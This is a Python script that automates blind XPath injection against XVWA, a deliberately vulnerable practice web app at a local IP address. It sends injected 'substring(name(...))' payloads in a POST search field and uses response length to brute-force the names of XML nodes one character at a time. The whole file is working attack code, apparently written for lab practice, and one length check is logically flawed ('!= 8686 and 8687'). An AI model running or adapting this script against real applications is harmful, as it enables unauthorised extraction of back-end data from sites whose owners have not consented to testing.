#!/usr/bin/python3 

import sys, requests, time, signal, string 
from pwn import log 

def ctrl_c(sig, frame): 
    print("\n\n[!] Quiting...\n\n")
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

url = 'http://192.168.1.33/xvwa/vulnerabilities/xpath/'
characters = string.ascii_letters 

def xPathInjection_primaryLabel(): 
    
    data=""

    p1 = log.progress("Brute force")

    time.sleep(1)
    p1.status("Initalizing brute force process")
    time.sleep(1)

    p2 = log.progress("Payload")

    for position in range(1, 8):
        for character in characters: 
            

            post_data = {
                'search': "1' and substring(name(/*[1]),%d,1)='%s" % (position, character),
                'submit': ''
            }

            p2.status(str(post_data))

            r = requests.post(url, data=post_data)
            
            if len(r.text) != 8681: 
                data+=character 
                break 

    p1.success("Process completed")
    p2.success(data)


def xPathInjection_secondaryLabel():

    data=""
    labels = []

    p1 = log.progress("Brute force")

    time.sleep(1)
    p1.status("Initalizing brute force process")
    time.sleep(1)

    p2 = log.progress("Payload")

    for label in range(1, 11):
        for position in range(1, 7):
            for character in characters: 
            

                post_data = {
                    'search': "1' and substring(name(/*[1]/*[%d]),%d,1)='%s" % (label,position, character),
                    'submit': ''
                }

                p2.status(str(post_data))

                r = requests.post(url, data=post_data)
                print(len(r.text)) 
                if len(r.text) != 8686 and 8687:
                    data+=character 
                    break 

        labels.append(data)
        data = ""

    p1.success("Process completed")
    p2.success(str(labels))


if __name__ == "__main__": 
    #xPathInjection_primaryLabel()
    xPathInjection_secondaryLabel()
